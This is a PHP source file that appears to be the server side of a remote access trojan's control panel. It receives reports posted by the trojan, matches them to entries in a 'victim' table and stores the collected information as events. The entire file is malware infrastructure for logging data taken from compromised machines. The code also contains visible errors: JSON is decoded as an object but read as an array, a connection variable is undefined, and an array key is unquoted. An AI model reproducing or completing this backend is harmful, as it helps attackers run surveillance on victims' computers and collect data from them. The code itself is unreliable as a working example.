<?php
/***
/* 
/*
/**/

if (isset($_POST['ri'])) {
	// $infoFromRat = base64_decode($_POST['ri']);
	// if (!$infoFromRat) {
	// 	die();
	// }
	$infoFromRat = json_decode($_POST['ri']);
	if (!$infoFromRat) {
		die();
	}
	if (isset($infoFromRat['c']) && isset($infoFromRat['i'])) {
		// try to check victim
		$queryStr = "SELECT `id` FROM `victim` WHERE name=?";
		if (!$query = App::getDbConnection()->prepare($queryStr)) {
            return false;
        }
        $query->bind_param("s", $infoFromRat['c']);
        $query->execute();
        $query->bind_result($victim_id);
        $query->fetch();
        $query->close();
        if (isset($victim_id)) {
        	// add info to db
        	$queryStr = "INSERT INTO `event`(victim_id, info) VALUES(?, ?)";
        	if (!$query = App::getDbConnection()->prepare($queryStr)) {
        	    return false;
        	}
        	$connection->bind_param("ss", $victim_id, $infoFromRat[i]);
        	$query->execute();
        	$query->close();
        	
        } else {
        	// @todo add new victim
        }
	}
}